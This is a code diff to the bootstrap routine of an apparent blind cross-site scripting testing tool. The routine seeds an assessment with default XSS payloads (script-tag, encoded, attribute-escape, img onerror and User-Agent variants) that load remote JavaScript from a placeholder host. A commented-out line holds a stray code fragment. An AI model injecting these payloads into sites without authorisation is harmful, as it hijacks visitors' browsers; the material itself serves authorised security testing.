@@ -106,17 +106,17 @@ def default_login():
 
 from collections import namedtuple
 DefaultPayload = namedtuple(
-    'DefaultPayload', ['payload', 'url', 'method', 'parameter', 'notes'])
+    'DefaultPayload', ['payload', 'notes', 'snooze', 'run_once'])
 DEFAULT_PAYLOADS = [
-    DefaultPayload('<script src=$1></script>', None, 'GET', None, 'Generic'),
-    DefaultPayload('</script><script src=$1>', None, 'GET', None, 'Reversed'),
+    DefaultPayload('<script src=$1></script>', None, False, False),
+    DefaultPayload('</script><script src=$1>', None, False, False),
     DefaultPayload(
-        '&lt;script src=$1&gt;&lt;/script&gt;', None, 'GET', None, 'Generic Encoded'),
+        '&lt;script src=$1&gt;&lt;/script&gt;', None, False, False),
     DefaultPayload('&lt;/script&gt;&lt;script src=$1&gt;',
-                   None, 'GET', None, 'Generic Reversed'),
-    DefaultPayload('''" onload="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);" garbage="''', None, 'GET', None, 'DOM Attribute Escape'),  # noqa
-    DefaultPayload("""'"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'For where "<script" is banned'),  # noqa
-    DefaultPayload("""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 '"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'Promiscuous User Agent')  # noqa
+                   None, False, False),
+    DefaultPayload('''" onload="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);" garbage="''', None, False, False),  # noqa
+    DefaultPayload("""'"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, False, False),  # noqa
+    DefaultPayload("""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 '"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, False, False)  # noqa
 ]
 
 DefaultJavascript = namedtuple('DefaultJavascript', ['name', 'code', 'notes'])
@@ -149,7 +149,10 @@ def create_bootstrap_assessment(name="General", add_default_payloads=True):
         print("Assessment with name", name, "already exists, exiting.")
         return
     else:
-        assessment = Assessment(name=name, access_log_enabled=False)
+        assessment = Assessment(name=name, access_log_enabled=False, snooze=False, run_once=False)
+        # add assessment
+        db.session.add(assessment)
+        db.session.commit()
 
     existing_payload = Payload.query.filter(Payload.id == 1).first()
 
@@ -160,17 +163,12 @@ def create_bootstrap_assessment(name="General", add_default_payloads=True):
             for payload in DEFAULT_PAYLOADS:
                 payload = Payload(
                     payload=payload.payload,
-                    url=payload.url,
-                    method=payload.method,
-                    parameter=payload.parameter,
                     notes=payload.notes,
-                    ordering=u'1',
-                    snooze=False,
-                    run_once=False
+                    ordering=u'1'
                 )
-                assessment.payloads.append(payload)
-        db.session.add(assessment)
-        db.session.commit()
+                #assessment.payloads.append(payload)['payload', 'notes', 'snooze', 'run_once'])
+                db.session.add(payload)
+                db.session.commit()
 
     existing_javascript = Javascript.query.filter(Javascript.id == 1).first()
 
